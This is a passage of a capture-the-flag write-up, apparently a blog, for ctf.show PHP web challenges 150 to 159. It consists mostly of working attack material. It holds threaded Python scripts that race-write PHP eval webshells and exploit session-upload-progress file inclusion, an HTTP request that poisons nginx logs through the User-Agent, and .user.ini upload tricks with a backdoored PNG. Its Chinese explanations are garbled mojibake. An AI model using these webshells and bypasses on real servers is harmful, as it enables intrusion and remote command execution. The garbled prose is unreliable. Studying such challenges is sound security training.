class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">&quot;http://5b684686-4c1c-4d84-8426-b24cff7e49c3.challenge.ctf.show:8080/&quot;</span>+<span class="string">&quot;?ctf=4.php&quot;</span></span><br><span class="line">        fromdata=&#123;<span class="string">&quot;show&quot;</span>:<span class="string">&quot;&lt;?php eval($_GET[&#x27;S&#x27;]);?&gt;&quot;</span>&#125;</span><br><span class="line">        response = requests.post(url=url,data=fromdata)</span><br><span class="line">        <span class="built_in">print</span>(response.status_code)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#cmd = &quot;system(&#x27;ls /&#x27;)&quot;</span></span><br><span class="line">        url = <span class="string">&quot;http://5b684686-4c1c-4d84-8426-b24cff7e49c3.challenge.ctf.show:8080/4.php?S=system(&#x27;tac /ctfshow_fl0g_here.txt&#x27;);&quot;</span></span><br><span class="line">        response = requests.get(url=url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># threads = []</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># t1 = threading.Thread(target=write)</span></span><br><span class="line"><span class="comment"># t2 = threading.Thread(target=read)</span></span><br><span class="line"><span class="comment"># threads.append(t1)</span></span><br><span class="line"><span class="comment"># threads.append(t2)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t1 = threading.Thread(target=write)</span><br><span class="line">        t1.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t1.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t2 = threading.Thread(target=read)</span><br><span class="line">        t2.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t2.start()</span><br><span class="line">    <span class="comment"># for t in threads:</span></span><br><span class="line">    <span class="comment">#     t.join()</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web150">web150</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤å­—ç¬¦</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ—¥å¿—åŒ…å«</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?isVIP=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ffe1355-5551-4386-992e-70c1c9f7197b.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php eval($_POST[0]);?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>55</span><br><span class="line"></span><br><span class="line"><span class="language-arcade">ctf=<span class="regexp">/var/</span><span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>&amp;<span class="number">0</span>=system(<span class="string">&#x27;tac flag.php&#x27;</span>);</span></span><br></pre></td></tr></table></figure><h4><span id="web150plus">web150plus</span></h4><ul><li>æ–¹æ³•ä¸€ï¼šautoload()</li></ul><blockquote><p>è¿™ä¸ªé¢˜ä¸€ç‚¹ç‚¹å°å‘__autoload()å‡½æ•°ä¸æ˜¯ç±»é‡Œé¢çš„__</p><p><code>__autoload() //åœ¨ä»£ç ä¸­å½“è°ƒç”¨ä¸å­˜åœ¨çš„ç±»æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚</code><br>class_existsä¹Ÿèƒ½è§¦å‘,ä¸è¿‡åœ¨äºæ€ä¹ˆç»™<code>$__CTFSHOW__</code>èµ‹å€¼,å› ä¸ºä¸‹åˆ’çº¿è¢«è¿‡æ»¤äº†,åªè¦èƒ½ç»•è¿‡ä¸‹åˆ’çº¿å°±å¯ä»¥äº†<br>æœ€åæ„é€ ?..CTFSHOW..&#x3D;phpinfoå°±å¯ä»¥çœ‹åˆ°phpinfoä¿¡æ¯å•¦<br>åŸå› æ˜¯..CTFSHOW..è§£æå˜é‡æˆ__CTFSHOW__ç„¶åè¿›è¡Œäº†å˜é‡è¦†ç›–ï¼Œå› ä¸ºCTFSHOWæ˜¯ç±»å°±ä¼šä½¿ç”¨<br>__autoload()å‡½æ•°æ–¹æ³•ï¼Œå»åŠ è½½ï¼Œå› ä¸ºç­‰äºphpinfoå°±ä¼šå»åŠ è½½phpinfo<br>æ¥ä¸‹æ¥å°±å»getshellå•¦</p></blockquote><ul><li><p>æ–¹æ³•äºŒï¼šæ¡ä»¶ç«äº‰</p><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSè¿›è¡Œæ–‡ä»¶åŒ…å«</a></p><blockquote><p>è¿™ä¸ªåŒ…å«æ¼æ´åœ¨php5.4ä¹‹åå¯ä»¥ä½¿ç”¨</p><p>å› ä¸ºåœ¨php5.4ä¹‹åphp.iniå¼€å§‹æœ‰äº†å‡ ä¸ªsessionçš„é»˜è®¤é€‰é¡¹</p><p>1.session.upload_progress.enabled &#x3D; on<br>2.session.upload_progress.cleanup &#x3D; on<br>3.session.upload_progress.prefix &#x3D; â€œupload_progress_â€<br>4.session.upload_progress.name &#x3D; â€œPHP_SESSION_UPLOAD_PROGRESSâ€<br>5.session.use_strict_mode&#x3D;off</p><p>ç¬¬ä¸€ä¸ªè¡¨ç¤ºå½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­<br>ç¬¬äºŒä¸ªè¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹<br>ç¬¬ä¸‰å’Œç¬¬å››ä¸ªprefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å<br>ç¬¬äº”ä¸ªè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­sessionIDå¯æ§<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨session.upload_progresså°†æœ¨é©¬å†™å…¥sessionæ–‡ä»¶ï¼Œç„¶ååŒ…å«è¿™ä¸ªsessionæ–‡ä»¶å› ä¸ºsession.use_strict_mode&#x3D;offæ‰€ä»¥sessionçš„æ–‡ä»¶åæˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œæ¯”å¦‚æ·»åŠ ä¸€ä¸ªCookie:PHPSESSID&#x3D;flag,PHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶sess_flagï¼Œè¿˜æœ‰session.upload_progress.cleanup &#x3D; oné»˜è®¤å¼€å¯æ‰€ä»¥åœ¨æˆ‘ä»¬ä¼ å…¥ä¸€å¥è¯æœ¨é©¬å°±ä¼šè¢«ç«‹å³åˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç”¨æ¡ä»¶ç«äº‰æ¥è¿›è¡ŒåŒ…å«</p><p>å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://de6906e6-f354-48f4-960d-5a479b6ec627.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSå°†æœ¨é©¬å†™å…¥sessionã€‚åœ¨session.upload_progress.name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;çš„æ¡ä»¶ä¸‹ä¸Šä¼ æ–‡ä»¶å°±ä¼šæŠŠè¿™æ¬¡ä¸Šä¼ çš„ä¿¡æ¯å­˜å‚¨åœ¨/tmp/sess_flagä¸­&#x27;&#x27;&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç”¨æ¥ä¸Šä¼ è¿›è¡Œæ¡ä»¶ç«äº‰&#x27;&#x27;&#x27;</span></span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;ä»¥sessionçš„æ–¹å¼postä¸Šä¼ PHPSESSIDå’Œè¦æ‰§è¡Œçš„è¯­å¥&#x27;&#x27;&#x27;</span></span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;è¿™é‡ŒçŒœæµ‹sessionæ–‡ä»¶åœ¨tmpç›®å½•ä¸‹&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="string">&#x27;ctf&#x27;</span>:<span class="string">&#x27;/tmp/sess_flag&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;è·å–æ–‡ä»¶åŒ…å«è¿‡åçš„è¿”å›æ•°æ®&#x27;&#x27;&#x27;</span></span><br><span class="line">        response = session.post(url+<span class="string">&#x27;?isVIP=1&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;å®ä¾‹åŒ–ä¸‹session&#x27;&#x27;&#x27;</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;åˆ›å»ºå¤šä¸ªçº¿ç¨‹,ä¸€ä¸ªthreadå¯¹è±¡ä»£è¡¨ä¸€ä¸ªçº¿ç¨‹&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure></li></ul><h3><span id="æ–‡ä»¶ä¸Šä¼ ">æ–‡ä»¶ä¸Šä¼ </span></h3><p><a href="https://www.dazhuanlan.com/vip_mmles/topics/1547397">.htaccess å’Œ.user.ini é…ç½®æ–‡ä»¶å¦™ç”¨</a></p><ul><li><p>æ ‡ç­¾</p><blockquote><p>æœ‰æ—¶å€™ä¼šå±è”½phpçš„æ ‡ç­¾<?php?></p><p>æˆ‘ä»¬å¯ä»¥ç”¨çŸ­æ ‡ç­¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt;<span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span>         <span class="comment">//short_open_tags=on</span></span><br><span class="line"></span><br><span class="line">&gt;<span class="meta">&lt;?=</span>(è¡¨è¾¾å¼)<span class="meta">?&gt;</span> ç­‰ä»·äº <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span> <span class="comment">//æ— é™åˆ¶</span></span><br><span class="line"></span><br><span class="line">&gt;&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;         <span class="comment">//asp_tags=on php_version &lt; 7</span></span><br><span class="line"></span><br><span class="line">&gt;&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="comment">//php_vsesion &lt; 7</span></span><br></pre></td></tr></table></figure></blockquote></li></ul><h4><span id="web153">web153</span></h4><ul><li>ä½¿ç”¨iniç»•è¿‡ï¼Œå…ˆæŠ“åŒ…ä¿®æ”¹ä¸Šä¼ iniæ–‡ä»¶</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1a6d1184-db8d-4671-a858-56d5451f64fd.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>205</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarysSdVv9iA9wMCmOIg</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://1a6d1184-db8d-4671-a858-56d5451f64fd.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1a6d1184-db8d-4671-a858-56d5451f64fd.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarysSdVv9iA9wMCmOIg</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">auto_prepend_file = <span class="number">1.</span>png</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarysSdVv9iA9wMCmOIg--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ pngï¼Œå¦‚æœæ²¡æ–‡ä»¶å¤´æ£€æµ‹ï¼Œå°±ç›´æ¥ä¼ pngé‡Œé¢ä¸€å¥è¯ä»£ç ï¼Œå¦åˆ™è¦éšä¾¿æˆªä¸ªå›¾ï¼Œç„¶åä»£ç æ”¾æœ€åã€‚</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="function">Host: 1<span class="title">a6d1184</span>-<span class="title">db8d</span>-4671-<span class="title">a858</span>-56<span class="title">d5451f64fd.challenge.ctf.show</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 205</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>: <span class="title">application</span>/<span class="title">json</span>, <span class="title">text</span>/<span class="title">javascript</span>, */*; <span class="title">q</span>=0.01</span></span><br><span class="line"><span class="function"><span class="title">X</span>-<span class="title">Requested</span>-<span class="title">With</span>: <span class="title">XMLHttpRequest</span></span></span><br><span class="line"><span class="function"><span class="title">User</span>-<span class="title">Agent</span>: <span class="title">Mozilla</span>/5.0 (<span class="title">Macintosh</span>; <span class="title">Intel</span> <span class="title">Mac</span> <span class="title">OS</span> <span class="title">X</span> 10<span class="title">_15_7</span>) <span class="title">AppleWebKit</span>/537.36 (<span class="title">KHTML</span>, <span class="title">like</span> <span class="title">Gecko</span>) <span class="title">Chrome</span>/103.0.0.0 <span class="title">Safari</span>/537.36</span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>; <span class="title">boundary</span>=----<span class="title">WebKitFormBoundarysSdVv9iA9wMCmOIg</span></span></span><br><span class="line"><span class="function"><span class="title">Origin</span>: <span class="title">http</span>://1<span class="title">a6d1184</span>-<span class="title">db8d</span>-4671-<span class="title">a858</span>-56<span class="title">d5451f64fd.challenge.ctf.show</span></span></span><br><span class="line"><span class="function"><span class="title">Referer</span>: <span class="title">http</span>://1<span class="title">a6d1184</span>-<span class="title">db8d</span>-4671-<span class="title">a858</span>-56<span class="title">d5451f64fd.challenge.ctf.show</span>/</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Encoding</span>: <span class="title">gzip</span>, <span class="title">deflate</span></span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Language</span>: <span class="title">zh</span>-<span class="title">CN</span>,<span class="title">zh</span>;<span class="title">q</span>=0.9</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------<span class="title">WebKitFormBoundarysSdVv9iA9wMCmOIg</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Disposition</span>: <span class="title">form</span>-<span class="title">data</span>; <span class="title">name</span>=&quot;<span class="title">file</span>&quot;; <span class="title">filename</span>=&quot;1.<span class="title">png</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">image</span>/<span class="title">png</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;?<span class="title">php</span> <span class="title">eval</span>($<span class="title">_POST</span>[&#x27;<span class="title">x</span>&#x27;]);?&gt;</span></span><br><span class="line"><span class="function">------<span class="title">WebKitFormBoundarysSdVv9iA9wMCmOIg</span>--</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><h4><span id="web156">web156</span></h4><blockquote><p>[]å¯ä»¥ç”¨{}æ¥ç»•è¿‡ï¼Œ</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// ç­‰ä»·äº</span></span><br><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4><span id="web157">web157</span></h4><p>ç»è¿‡æµ‹è¯•å‘ç°è¿‡æ»¤æ‰äº†å¤§æ‹¬å·{}ï¼Œ[]ï¼Œï¼›</p><p>æ‰€ä»¥å¯ä»¥è¯´è¿™æ ·åŸºæœ¬æŠŠé©¬ç»™é”æ­»äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä»»æ„æ‰§è¡Œphpï¼Œå°±ç”¨ç³»ç»Ÿå‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹ï¼Œç›´æ¥æ‰¾åˆ°flagæ–‡ä»¶</p><h4><span id="web-159">web 159</span></h4><p>æœ¬é¢˜è¿‡æ»¤æ‰äº†</p><blockquote><p>php</p><p>{}</p><p>[]</p><p>;</p><p>()</p></blockquote><p>æ‰€ä»¥å°±æ— 